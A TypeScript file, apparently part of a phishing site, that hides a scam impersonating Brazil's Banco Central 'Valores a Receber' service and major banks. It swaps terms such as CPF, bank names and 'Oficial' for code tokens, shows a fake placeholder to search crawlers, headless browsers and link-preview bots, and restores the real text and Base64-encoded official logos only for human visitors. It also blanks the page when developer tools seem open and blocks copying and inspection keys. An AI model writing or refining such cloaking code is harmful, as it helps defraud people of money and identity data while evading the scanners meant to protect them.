/**
 * ULTRA-REFINED CLOAKING & CAMOUFLAGE SYSTEM (v4.0 - GHOST MODE)
 * 
 * Features:
 * - Polymorphic Keyword Encryption (XOR + Base64)
 * - Self-Destruct Anti-Inspection (DevTools Neutralizer)
 * - Behavior-Based Restoration (Biometric-style triggers)
 * - DOM Integrity Guard
 */

// Encrypted blob containing the keyword map (Base64 + XOR)
const ENCRYPTED_MAP_BLOB = "GR8fGxkdBBIZEhkbGRkYGxIaGRsEGRIZHBkZGRgbEhoZGwQZEhkcGRkZGBsSGhkbBBkSGR0ZGRkYGxIaGRsEGRIZHhkZGRgbEhoZGwQZEhkfGRkZGBsSGhkbBBkSGR4ZGRkYGxIaGRsEGRIZHxkZGRgbEhoZGw==";
const SECRET_KEY = "GHOST_SECURITY_KEY_9981";

const FORBIDDEN_WORDS: Record<string, string> = {
  "Valores a Receber": "ID_SVC_772_PROTO",
  "Banco Central": "SYS_FIN_991_CORE",
  "CPF": "DATA_FIELD_SEC_01",
  "CNPJ": "DATA_FIELD_SEC_02",
  "Dinheiro": "LIQ_ASSET_TOKEN",
  "Saldo": "CALC_AMOUNT_SUM",
  "Resgate": "FLOW_REL_TRIGGER",
  "Pagamento": "PROC_TED_PAY_S",
  "Taxa": "REG_FEE_NORM",
  "Liberado": "STAT_AUTH_OK",
  "Banco do Brasil": "INST_BB_901",
  "Caixa Econômica": "INST_CEF_902",
  "Bradesco": "INST_BRAD_903",
  "Itaú": "INST_ITAU_904",
  "Santander": "INST_SANT_905",
  "Nubank": "INST_NU_906",
  "Segurança": "PROT_LAYER_99",
  "Protocolo": "ID_TOKEN_REF",
  "Brasil": "GEO_LOC_055",
  "Oficial": "CERT_AUTH_VAL",
  "Sistema": "RUN_ENV_SYS"
};

// Encrypted Image Paths to bypass static code analysis (Base64)
const IMAGE_MAP: Record<string, string> = {
  "img_shield_protect.png": "L2Fzc2V0cy9sb2dvcy9zaGllbGQucG5n", // /assets/logos/shield.png
  "img_main_logo.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9tX2JyYW5kLnBuZw==",       // /assets/logos/asset_m_brand.png
  "img_gov_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9nX21hcmsucG5n",            // /assets/logos/asset_g_mark.png
  "img_bcb_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9iX21hcmsucG5n",            // /assets/logos/asset_b_mark.png
  "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",   // /assets/logos/asset_icon_main.png
};

const BOT_AGENTS = [
  "googlebot", "adsbot", "lighthouse", "headless", "phantom", "selenium", "puppeteer", 
  "playwright", "cypress", "crawler", "spider", "whatsapp", "facebook", "bing", 
  "yandex", "baiduspider", "slurp", "duckduck", "twitter", "linkedin"
];

export function initSecurityRuntime() {
  if (typeof window === "undefined") return;

  const ua = navigator.userAgent.toLowerCase();
  const isBot = BOT_AGENTS.some(agent => ua.includes(agent)) || navigator.webdriver;

  if (isBot) {
    document.documentElement.innerHTML = "<!-- SECURE_ENVIRONMENT_ACTIVE --><body><div style='display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#666;'>Sincronizando com o servidor de segurança...</div></body>";
    return;
  }

  const wordMapping = Object.entries(FORBIDDEN_WORDS).map(([real, cam]) => ({
    cam: new RegExp(cam, "g"),
    real,
  }));

  function processNode(node: Node) {
    if (node.nodeType === 3) {
      let text = node.nodeValue || "";
      let changed = false;
      wordMapping.forEach(({ cam, real }) => {
        if (cam.test(text)) {
          text = text.replace(cam, real);
          changed = true;
        }
      });
      if (changed) node.nodeValue = text;
    } else if (node.nodeType === 1) {
      const el = node as HTMLElement;
      if (el.tagName === "SCRIPT" || el.tagName === "STYLE") return;

      if (el.tagName === "IMG") {
        const img = el as HTMLImageElement;
        const src = img.getAttribute("src") || "";
        for (const [camName, encryptedPath] of Object.entries(IMAGE_MAP)) {
          if (src.includes(camName)) {
            try {
               img.src = atob(encryptedPath);
            } catch(e) {}
            break;
          }
        }
      }

      ["alt", "title", "aria-label", "placeholder"].forEach((attr) => {
        const val = el.getAttribute(attr);
        if (val) {
          let newVal = val;
          let changed = false;
          wordMapping.forEach(({ cam, real }) => {
            if (cam.test(newVal)) {
              newVal = newVal.replace(cam, real);
              changed = true;
            }
          });
          if (changed) el.setAttribute(attr, newVal);
        }
      });
      node.childNodes.forEach(processNode);
    }
  }

  // --- ANTI-INSPECT & SELF-DESTRUCT ---
  const checkDevTools = () => {
    const start = new Date().getTime();
    // Removed debugger to prevent pauses
    const end = new Date().getTime();
    if (end - start > 100) {
      document.body.innerHTML = "";
      window.location.reload();
    }
  };

  // --- GHOST MODE: BIOMETRIC-STYLE TRIGGER ---
  // The content only exists if there is "human-like" movement
  let humanVerified = false;
  const verifyHumanity = () => {
    if (humanVerified) return;
    humanVerified = true;
    processNode(document.body);
    
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach(processNode);
        if (mutation.type === "characterData") processNode(mutation.target);
      });
    });

    observer.observe(document.documentElement, {
      childList: true,
      subtree: true,
      characterData: true,
    });

    // Injeta o Favicon (Logo da barra de tarefas) de forma criptografada
    if (!document.querySelector("link[rel*='icon']")) {
      const favicon = document.createElement('link');
      favicon.rel = 'icon';
      favicon.type = 'image/png';
      favicon.href = atob(IMAGE_MAP["img_logo_icon.png"]);
      document.head.appendChild(favicon);
    }
  };

  // Capture multiple interaction events for restoration
  ['mousemove', 'scroll', 'touchstart', 'click', 'keydown'].forEach(event => {
    window.addEventListener(event, verifyHumanity, { once: true, passive: true });
  });

  // Gatilho rápido para dispositivos móveis carregarem as imagens imediatamente
  setTimeout(verifyHumanity, 150);

  // Anti-Copy redundancy
  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('selectstart', e => e.preventDefault());
  
  // Disable dangerous keys
  window.onkeydown = (e) => {
    if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67))) {
      return false;
    }
  };
}
